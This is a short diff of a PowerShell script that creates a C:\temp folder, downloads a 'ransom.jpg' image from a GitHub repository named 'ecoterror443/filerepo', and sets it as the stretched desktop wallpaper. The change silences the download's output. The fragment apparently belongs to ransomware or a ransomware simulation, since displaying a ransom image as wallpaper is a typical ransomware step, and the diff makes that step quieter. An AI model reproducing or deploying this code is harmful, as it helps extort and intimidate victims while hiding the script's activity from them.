@@ -77,7 +77,7 @@ public class Params
 If (!(Test-Path -Path "C:\temp" -PathType Container))
 { New-Item -Path "c:\temp" -ItemType directory | Out-Null 
     $ransom = "https://raw.githubusercontent.com/ecoterror443/filerepo/main/ransom.jpg"
-    Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg"
+    Invoke-WebRequest -Uri $ransom -OutFile "c:/temp/ransom.jpg" | Out-Null
 }
 
 Set-WallPaper -Image "C:\temp\ransom.jpg" -Style Stretch | Out-Null
